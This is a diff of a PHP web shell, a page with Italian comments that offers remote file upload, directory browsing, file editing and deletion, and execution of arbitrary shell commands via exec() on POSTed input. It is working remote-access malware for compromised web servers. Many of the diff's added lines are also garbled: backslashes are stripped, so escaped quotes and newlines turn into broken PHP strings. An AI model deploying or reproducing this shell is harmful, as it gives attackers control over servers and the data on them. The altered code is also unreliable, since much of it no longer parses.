@@ -76,15 +76,15 @@ function getperms($f)  {
     $mode=fileperms($f);
 
     $perm='';
-    $perm .= ($mode &amp; 00400) ? 'r' : '-';
-    $perm .= ($mode &amp; 00200) ? 'w' : '-';
-    $perm .= ($mode &amp; 00100) ? 'x' : '-';
-    $perm .= ($mode &amp; 00040) ? 'r' : '-';
-    $perm .= ($mode &amp; 00020) ? 'w' : '-';
-    $perm .= ($mode &amp; 00010) ? 'x' : '-';
-    $perm .= ($mode &amp; 00004) ? 'r' : '-';
-    $perm .= ($mode &amp; 00002) ? 'w' : '-';
-    $perm .= ($mode &amp; 00001) ? 'x' : '-';
+    $perm .= ($mode & 00400) ? 'r' : '-';
+    $perm .= ($mode & 00200) ? 'w' : '-';
+    $perm .= ($mode & 00100) ? 'x' : '-';
+    $perm .= ($mode & 00040) ? 'r' : '-';
+    $perm .= ($mode & 00020) ? 'w' : '-';
+    $perm .= ($mode & 00010) ? 'x' : '-';
+    $perm .= ($mode & 00004) ? 'r' : '-';
+    $perm .= ($mode & 00002) ? 'w' : '-';
+    $perm .= ($mode & 00001) ? 'x' : '-';
 
     return $perm;
 }
@@ -117,7 +117,7 @@ if (!isset($_POST['file']))  {
 <form enctype="multipart/form-data" action="<?php print $_SERVER['REQUEST_URI']; ?>" method="POST">
     <input type="hidden" name="MAX_FILE_SIZE" value="200000000"/>
     <input type="hidden" name="do_upload" value="true">
-        <tr><td>&amp;gt; load a file</td></tr>
+        <tr><td>&gt; load a file</td></tr>
         <tr><td><input type="file" name="userfile"/></td></tr>
         <tr><td><input type="submit" value="> send"/></td></tr>
 </form>
@@ -137,7 +137,7 @@ if (!isset($_POST['file']))  {
 #
 # Upload di file
 #
-if ($_POST['do_upload']==="true")  {
+if (@$_POST['do_upload']==="true")  {
     if ($_POST['dir']=="true")
         $dir=$_POST['dirname'];
     else
@@ -146,13 +146,13 @@ if ($_POST['do_upload']==="true")  {
     $uploadfile=$dir."/".basename($_FILES['userfile']['name']);
 
     if (move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile))  {
-        print "File successfully loaded<br>\n";
+        print "File successfully loaded<br>n";
         print "~ file name: <b>".$_FILES['userfile']['name']."</b><br>".
-            "\n~ type: ".$_FILES['userfile']['type']."<br>\n".
-            "~ size: ".$_FILES['userfile']['size']." bytes<br>\n";
+            "n~ type: ".$_FILES['userfile']['type']."<br>n".
+            "~ size: ".$_FILES['userfile']['size']." bytes<br>n";
     }
 
-    else print "$ Error while loading ".$_FILES['userfile']['name']."<br>\n";
+    else print "$ Error while loading ".$_FILES['userfile']['name']."<br>n";
 }
 
 #
@@ -168,20 +168,20 @@ if (isset($_POST['dofile']))  {
     #
     if (isset($_POST['save']))  {
         if (!($fp=fopen($fname,"w")))
-            die ("$ Unable to write to <b>$fname</b><br>\n");
+            die ("$ Unable to write to <b>$fname</b><br>n");
 
         fputs ($fp,$content);
         fclose($fp);
 
-        print ("File <b>$fname</b> successfully updated<br><br>\n");
+        print ("File <b>$fname</b> successfully updated<br><br>n");
     }
 
     #
     # Cancellazione
     #
     if (isset($_POST['remove']))  {
-        unlink ($fname) or die ("$ Unable to remove <b>$fname</b><br>\n");
-        print "<b>$fname</b> successfully removed<br><br>\n";
+        unlink ($fname) or die ("$ Unable to remove <b>$fname</b><br>n");
+        print "<b>$fname</b> successfully removed<br><br>n";
     }
 }
 
@@ -193,13 +193,13 @@ if (isset($_POST['cmd']))  {
     $output=array();
     exec ($cmd,$output);
 
-    print "<br><hr height=1 width=\"100%\">\n";
+    print "<br><hr height=1 width="100%">n";
     print "# cmd output: <br><br><tt>";
-    print "<div style=\"border: 1px solid #090; background-color: #000; padding: 10px\">\n";
+    print "<div style="border: 1px solid #090; background-color: #000; padding: 10px">n";
 
     foreach ($output as $line)
-        print "$line<br>\n";
-    print "</div></tt>\n";
+        print "$line<br>n";
+    print "</div></tt>n";
     die('');
 }
 
@@ -210,19 +210,19 @@ if (isset($_POST['fname']))  {
     print "# Warning: editing or removing a file is only possible if you've got the privileges to do that<br><br>";
 
     $fname=htmlentities($_POST['fname']);
-    $file=file($fname) or print "$ Unable to open <b>$fname</b><br>\n";
+    $file=file($fname) or print "$ Unable to open <b>$fname</b><br>n";
 
-    print "<form action=\"".$_SERVER['REQUEST_URI']."\" method=\"POST\">\n";
-    print "<input type=\"hidden\" name=\"dofile\" value=\"$fname\">\n";
-    print "<textarea rows=20 cols=80 name=\"content\">";
+    print "<form action="".$_SERVER['REQUEST_URI']."" method="POST">n";
+    print "<input type="hidden" name="dofile" value="$fname">n";
+    print "<textarea rows=20 cols=80 name="content">";
 
     for ($i=0; $i<count($file); $i++)
         print htmlentities($file[$i]);
 
-    print "</textarea><br><br>\n";
-    print "<input type=\"submit\" value=\"> Save file\" name=\"save\">\n";
-    print "<input type=\"submit\" value=\"> Delete file\" name=\"remove\">\n";
-    print "</form>\n";
+    print "</textarea><br><br>n";
+    print "<input type="submit" value="> Save file" name="save">n";
+    print "<input type="submit" value="> Delete file" name="remove">n";
+    print "</form>n";
 }
 
 #
@@ -233,12 +233,12 @@ if (isset($_POST['dirname']))
 else
     $path=getcwd();
 
-$dp=opendir($path) or die("$ Unable to open <b>$path</b><br>\n");
+$dp=opendir($path) or die("$ Unable to open <b>$path</b><br>n");
 chdir ($path);
 $path=getcwd();
 
-print "<div id=\"view\"><hr height=1 width=\"100%\">\n";
-print "<font color=\"white\">&amp;gt; cwd: <b>".getcwd()."</b></font><br><br>\n\n";
+print "<div id="view"><hr height=1 width="100%">n";
+print "<font color="white">&gt; cwd: <b>".getcwd()."</b></font><br><br>nn";
 $dir=array();
 
 while ($file=readdir($dp))
@@ -254,20 +254,20 @@ sort($dir);
 <table border=0 width="100%" style="border: 1px #090 solid; background-color: #000">
 <?php
 for ($i=0; $i<count($dir); $i++)  {
-    print "<tr style='font-family: Arial; font-size: 11px;'>\n";
+    print "<tr style='font-family: Arial; font-size: 11px;'>n";
 
     #
     # Directory superiore
     #
     if (basename($dir[$i])==="..")  {
-        $tmp=split('/',getcwd());
+        $tmp=explode('/',getcwd());
         $new="";
 
         for ($j=0; $j<count($tmp)-1; $j++)
             $new .= $tmp[$j]."/";
 
-        print "<td width=\"40px\" id=\"cell\" style=\"font-size: 9px\">UP</td>\n";
-        print "<td id=\"cell\"><input type=\"submit\" name=\"dirname\" value=\"$new\" class=\"buttons\"></td></tr>\n";
+        print "<td width="40px" id="cell" style="font-size: 9px">UP</td>n";
+        print "<td id="cell"><input type="submit" name="dirname" value="$new" class="buttons"></td></tr>n";
     }
 
     #
@@ -275,10 +275,10 @@ for ($i=0; $i<count($dir); $i++)  {
     #
     if (is_dir($dir[$i]))  {
         if (basename($dir[$i])!='..')  {
-            print "<td width=\"40px\" id=\"cell\" style=\"font-size: 9px\">DIR</td>\n";
-            print "<td id=\"cell\"><input type=\"submit\" name=\"dirname\" value=\"".$dir[$i].
-                "\" class=\"buttons\"></td>\n";
-            print "<td id=\"cell\">DIR</td></tr>\n";
+            print "<td width="40px" id="cell" style="font-size: 9px">DIR</td>n";
+            print "<td id="cell"><input type="submit" name="dirname" value="".$dir[$i].
+                "" class="buttons"></td>n";
+            print "<td id="cell">DIR</td></tr>n";
         }
     }
     
@@ -287,14 +287,14 @@ for ($i=0; $i<count($dir); $i++)  {
     # 
     else  {
         if (basename($dir[$i])!='..')  {
-            print "<td width=\"40px\" id=\"cell\" style=\"font-size: 9px\">FILE</td>\n";
-            print "<td id=\"cell\"><input type=\"submit\" name=\"fname\" value=\"$dir[$i]\" class=\"buttons\"></td>\n";
-            print "<td id=\"cell\">".getperms($dir[$i])."</td></tr>\n";
+            print "<td width="40px" id="cell" style="font-size: 9px">FILE</td>n";
+            print "<td id="cell"><input type="submit" name="fname" value="$dir[$i]" class="buttons"></td>n";
+            print "<td id="cell">".getperms($dir[$i])."</td></tr>n";
         }
     }
 }
 
-print "</table></div>\n";
+print "</table></div>n";
 ?>
        
        </body>
